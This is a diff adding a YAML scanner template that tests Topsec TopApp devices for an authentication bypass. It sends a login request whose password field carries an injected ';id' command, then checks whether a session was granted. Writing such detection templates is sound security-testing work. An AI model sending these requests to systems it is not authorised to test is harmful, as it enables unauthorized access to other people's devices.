@@ -1,0 +1,35 @@
+name: yaml-poc-topsec-topapp-unauthorized_access-CT-479138
+binding: c1a33f66-b082-43c6-913c-360d047c904e
+detail:
+    author: system_user
+    links:
+        - https://www.cnblogs.com/yuzly/p/13673760.html
+    vulnerability:
+        id: fe03e6ad-a5ac-46c5-a9a3-a522edb19f6c
+        level: high
+transport: http
+set:
+    tmp_cookie: randomLowercase(26)
+    tmp_username: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /login_check.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+                Cookie: PHPSESSID={{tmp_cookie}}
+            body: userName={{tmp_username}}&password=%3Bid&x=0&y=0
+            follow_redirects: false
+        expression: response.status == 302 && response.headers["location"] == "redirect.php"
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /acc/Header.php
+            headers:
+                Cookie: PHPSESSID={{tmp_cookie}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(tmp_username))
+expression: r0() && r1()
